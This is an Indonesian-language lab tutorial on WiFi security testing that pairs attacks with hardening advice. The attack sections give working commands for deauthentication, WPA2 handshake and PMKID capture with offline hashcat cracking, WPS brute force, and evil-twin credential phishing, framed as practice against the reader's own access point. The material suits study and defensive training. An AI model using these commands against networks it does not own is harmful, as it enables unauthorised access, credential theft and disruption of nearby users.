# 📶 Lab — WiFi Hacking (Wireless)

> [!summary] Ringkasan
> Pelengkap keluarga [[Lab — Jaringan Vulnerable (Networking)|lab jaringan]] untuk sisi **nirkabel**. Beda mendasar dari lab kabel: WiFi **tidak bisa diemulasi murni** — kamu butuh **adapter wireless fisik** yang mendukung **monitor mode + packet injection**, plus sebuah **access point (AP) milikmu sendiri** sebagai target. Note ini mencakup tiga hal sekaligus: **setup lab WiFi**, **serangan** (deauth, capture handshake WPA2, PMKID, evil twin, WPS), dan **pertahanan** (WPA3, hardening AP). Latih **hanya di AP milikmu**.

**Bagian dari:** [[Lab — Jaringan Vulnerable (Networking)]] · [[Fondasi (MOC)]]
**Prasyarat:** [[Jaringan Nirkabel & 802.11 (WiFi)]] (teori band/channel, frame, WPA2/3 — pahami dulu), [[Jaringan Komputer]], [[Model OSI & TCP-IP]], [[Linux Dasar untuk Security]], [[Setup Lab (Virtualisasi)]]

---

> [!danger] Etika & hukum — WiFi sangat sensitif
> Menyerang WiFi orang lain (deauth, capture, cracking) **ilegal** dan mudah terdeteksi. Sinyal radio **bocor ke tetangga** — jangan kirim deauth/evil-twin yang bisa mengganggu jaringan sekitar. **Gunakan AP & klien milikmu sendiri**, idealnya daya pancar rendah / ruang terisolasi. Lihat etika di [[00 - START HERE]].

## 🧠 Konsep Inti

### Kenapa WiFi tak bisa "di-GNS3-kan"
Emulator ([[Lab — GNS3 (Setup)|GNS3]]/[[Lab — EVE-NG (Setup)|EVE-NG]]) mensimulasikan logika perangkat, **bukan radio (PHY layer 802.11)**. Serangan WiFi bekerja di level **frame radio** (deauth, beacon, handshake) yang harus ditangkap/dikirim oleh **radio asli**. Maka lab WiFi = **hardware**, bukan VM murni.

### Mode kerja kartu WiFi
- **Managed** — mode normal (terhubung ke 1 AP, hanya lihat trafik sendiri).
- **Monitor** — "dengar semua" frame 802.11 di udara (seperti promiscuous untuk radio). **Wajib** untuk menyadap.
- **Injection** — bisa **mengirim** frame buatan (deauth, dll). Tidak semua chipset mendukung.

### Anatomi serangan WPA2-PSK (paling umum)
1. WPA2-Personal mengamankan dengan **4-way handshake** saat klien connect.
2. Penyerang **menangkap handshake** itu (atau **PMKID** dari AP).
3. Handshake berisi bukti password ter-hash → di-**crack offline** dengan wordlist ([[Password Attacks]]). Password lemah = jebol.
4. WPA2 **tidak bisa di-brute online**; kekuatan keamanan = **kekuatan passphrase**.

| Target keamanan WiFi | Status | Catatan serang |
|---|---|---|
| **WEP** | usang/rusak total | crack dalam menit (IV lemah) — hampir punah |
| **WPS** | sering rentan | PIN 8-digit bisa di-brute (Reaver/Bully) |
| **WPA/WPA2-PSK** | umum | capture handshake/PMKID → crack offline |
| **WPA2-Enterprise** | lebih kuat | serang via evil-twin + curi kredensial 802.1X |
| **WPA3-SAE** | terkini | tahan offline-crack; ada celah "Dragonblood" (lama) & downgrade |

## 🛠️ Setup Lab WiFi

### 1. Adapter wireless yang mendukung monitor + injection
```text
Chipset yang teruji (cari adapter USB berbasis ini):
  - Atheros AR9271            (mis. TP-Link TL-WN722N v1 — HATI2: v2/v3 beda chipset!)
  - Ralink RT3070 / RT5572
  - Realtek RTL8812AU         (dual-band, butuh driver tambahan)
USB adapter eksternal lebih disukai → bisa di-passthrough ke VM Kali.
```
> [!warning] WiFi internal laptop biasanya TIDAK cukup
> Banyak kartu internal tak mendukung injection dan tak bisa di-passthrough ke VM. Adapter USB khusus jauh lebih andal.

### 2. Pasang ke Kali (VM perlu USB passthrough)
```bash
# Di VirtualBox/VMware: Settings → USB → tambahkan adapter ke VM Kali.
# Verifikasi di Kali:
iw dev                      # daftar interface wireless (mis. wlan0)
lsusb                       # pastikan adapter terdeteksi
sudo airmon-ng             # cek apakah dikenali aircrack-ng
```

### 3. Aktifkan monitor mode
```bash
sudo airmon-ng check kill          # matikan proses yang ganggu (NetworkManager)
sudo airmon-ng start wlan0         # → buat interface monitor (wlan0mon)
iw dev                             # konfirmasi type "monitor"
# (cara manual alternatif)
# sudo ip link set wlan0 down; sudo iw wlan0 set monitor control; sudo ip link set wlan0 up
```

### 4. Siapkan TARGET milikmu
```text
- Sebuah AP/router rumah cadangan ATAU hotspot HP → set SSID "LAB-TARGET",
  WPA2-PSK dengan password yang SENGAJA ada di wordlist (mis. "password123").
- Satu klien (HP/laptop) terhubung ke AP itu (untuk dipancing handshake).
- Catat: ini AP milikmu → sah untuk diserang.
```

## ⚔️ Praktik Serangan (di AP milikmu)

### 1. Recon udara — siapa saja yang memancar
```bash
sudo airodump-ng wlan0mon                  # daftar AP: BSSID, channel, ENC, ESSID
# kunci ke target & channel-nya, tulis ke file:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### 2. Capture WPA2 handshake (+ deauth untuk mempercepat)
```bash
# Paksa 1 klien reconnect → handshake tertangkap di airodump (pojok kanan atas "WPA handshake")
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c <MAC-klien> wlan0mon
# Crack offline dengan wordlist (lihat [[Password Attacks]]):
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# atau jalur hashcat (konversi dulu):
hcxpcapngtool -o hash.hc22000 capture-01.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### 3. PMKID attack (sering tanpa perlu klien)
```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### 4. WPS brute (jika AP mengaktifkan WPS)
```bash
sudo wash -i wlan0mon                       # cari AP dengan WPS aktif
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### 5. Evil Twin / Rogue AP (curi kredensial / MITM)
```bash
# AP palsu meniru SSID korban + captive portal phishing.
# Otomatis via framework:
sudo wifipumpkin3            # atau: airgeddon (menu interaktif, paling pemula-friendly)
# Konsep sama dgn social engineering → lihat [[Social Engineering]].
```

### 6. WPA3 — uji batasnya
```text
WPA3-SAE tahan terhadap crack offline handshake (tidak ada handshake yg bisa di-brute).
Yang diuji di lab: serangan DOWNGRADE (paksa klien turun ke WPA2 via evil twin
"transition mode") & celah "Dragonblood" lama. → bukti kenapa WPA3 + disable
transition mode penting (lihat pertahanan di bawah).
```

## 🛡️ Pertahanan (Hardening WiFi)

| Serangan | Mitigasi |
|---|---|
| Crack handshake/PMKID | **passphrase panjang & acak** (≥15 char) → wordlist tak mempan |
| WPS brute | **matikan WPS** di router |
| WEP | jangan pakai — ganti **WPA2/WPA3** |
| Evil twin | **WPA3-SAE** + matikan WPA3-transition; edukasi pengguna; 802.1X + validasi sertifikat |
| Deauth flood | **802.11w (Protected Management Frames/PMF)** — wajib di WPA3 |
| Korporat | **WPA2/3-Enterprise (802.1X/RADIUS)**, NAC, WIPS (deteksi rogue AP) |

```text
Praktik di router lab-mu:
 - Ganti ke WPA3 (atau WPA2 dengan PMF "required").
 - Matikan WPS. Sembunyikan/biarkan SSID (tak banyak menolong).
 - Passphrase kuat. Untuk kantor: pakai Enterprise + RADIUS.
```
> Pasangan defensif lebih luas: [[Hardening & Vulnerability Management]] & [[Network Security (Firewall, IDS-IPS)]]. Deteksi rogue AP / anomali = bagian [[Network Security Lanjutan (NSM-NDR)]].

## 🧯 Troubleshooting

> [!warning] Gejala → Solusi
> - **`airmon-ng` tak lihat kartu** → chipset tak didukung / USB belum di-passthrough ke VM. Cek `lsusb`, `dmesg`.
> - **Monitor mode gagal / langsung kembali managed** → `airmon-ng check kill` dulu (NetworkManager merebut interface).
> - **Injection tak jalan** → uji `sudo aireplay-ng --test wlan0mon`; chipset tertentu (mis. TL-WN722N **v2/v3**) tak inject — pakai v1/AR9271.
> - **Handshake tak tertangkap** → tak ada klien connect; pancing dengan deauth, dan pastikan channel (`-c`) benar.
> - **Tak ada paket** → kamu di channel salah; airodump full-scan dulu untuk lihat channel target.

## 🧰 Tools

- **aircrack-ng suite** — `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng` (inti WiFi pentest).
- **hcxdumptool / hcxpcapngtool** — capture & konversi PMKID untuk hashcat.
- **hashcat / John** — crack offline (mode 22000) → [[Password Attacks]].
- **Reaver / Bully** — WPS brute. **wash** — scan WPS.
- **airgeddon / wifipumpkin3 / Wifite** — framework otomatis (pemula-friendly).
- **Kismet** — wireless IDS / surveilans udara (juga sisi defensif).
- **Wireshark** — analisis frame 802.11 (lihat [[Model OSI & TCP-IP]]).

## 🔗 Kaitan

- Hub lab jaringan: [[Lab — Jaringan Vulnerable (Networking)]] (pelengkap nirkabel dari lab kabel).
- Cracking handshake/PMKID memakai teknik [[Password Attacks]] (wordlist, hashcat).
- Evil twin = bentuk [[Social Engineering]] (captive portal phishing).
- **Sisi Blue ↔** [[Network Security (Firewall, IDS-IPS)]], [[Hardening & Vulnerability Management]] (WPA3/PMF/802.1X), deteksi rogue AP via [[Network Security Lanjutan (NSM-NDR)]].
- Posisi di alur serang: jalur **Initial Access** alternatif → setelah masuk jaringan, lanjut [[Scanning & Enumeration]] → [[Post-Exploitation & Pivoting]].
- Dasar radio/lapisan: [[Jaringan Komputer]] · [[Model OSI & TCP-IP]].

## 🎯 Latihan

- Siapkan AP lab WPA2 dengan password yang ada di `rockyou.txt`, capture handshake via deauth, dan crack-nya dengan `aircrack-ng`/`hashcat`. Ganti password jadi 16-char acak, ulangi — buktikan kini **gagal**.
- Coba **PMKID attack** dengan `hcxdumptool` (tanpa klien) di AP-mu.
- Aktifkan **WPS** di router lab, brute dengan **Reaver**; lalu **matikan WPS** dan buktikan serangan berhenti.
- (Defensif) Ubah AP ke **WPA3 + PMF required**, jalankan deauth flood, dan amati klien **tidak** terputus.

## 📖 Sumber

- **Aircrack-ng documentation** — https://www.aircrack-ng.org/doku.php
- **Hashcat — mode 22000 (WPA-PBKDF2-PMKID+EAPOL)** — https://hashcat.net/wiki/
- **TryHackMe — "Wifi Hacking 101"**, **HTB — wireless modules**.
- **Wi-Fi Alliance — WPA3 specification** (sisi pertahanan).
- **Kismet** — https://www.kismetwireless.net
